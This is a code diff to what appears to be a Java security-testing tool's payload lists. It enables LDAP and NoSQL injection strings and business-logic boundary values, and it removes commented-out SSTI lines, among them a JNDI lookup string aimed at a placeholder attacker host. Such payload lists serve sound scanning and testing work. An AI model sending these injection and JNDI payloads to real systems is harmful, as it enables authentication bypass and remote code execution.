@@ -66,8 +66,8 @@ String[] LDAP_INJECTION_PAYLOADS = {
     "*)(&",
     "*))%00",
     ")(cn=*",
-//    "*)(uid=*",
-//    "admin)(&(password=*))",
+    "*)(uid=*",
+    "admin)(&(password=*))",
     "*()|%26'"
 };
 
@@ -77,9 +77,9 @@ String[] NOSQL_INJECTION_PAYLOADS = {
     ", $where: '1 == 1'",
     "$ne=1",
     "[$ne]=1",
-//    "'; return true; var dummy='",
-//    "{\"$gt\":\"\"}",
-//    "{\"$regex\":\".*\"}"
+    "'; return true; var dummy='",
+    "{\"$gt\":\"\"}",
+    "{\"$regex\":\".*\"}"
 };
 
 // Server-Side Template Injection (SSTI)
@@ -88,9 +88,7 @@ String[] SSTI_PAYLOADS = {
     "${7*7}",
     "#{7*7}",
     "{{config}}",
-    "<%=7*7%>",
-//    "${jndi:ldap://attacker.com/a}",
-//    "{{request.application.__globals__}}"
+    "<%=7*7%>"
 };
 
 // Format String Vulnerabilities
@@ -124,14 +122,14 @@ String[] JSON_INJECTION_PAYLOADS = {
 String[] BUSINESS_LOGIC_PAYLOADS = {
     "0",
     "-1",
-//    "999999999",
-//    "-999999999",
-//    "0.00",
-//    "-0.01",
+    "999999999",
+    "-999999999",
+    "0.00",
+    "-0.01",
     "true",
     "false",
-//    "null",
-//    "undefined"
+    "null",
+    "undefined"
 };
 
     
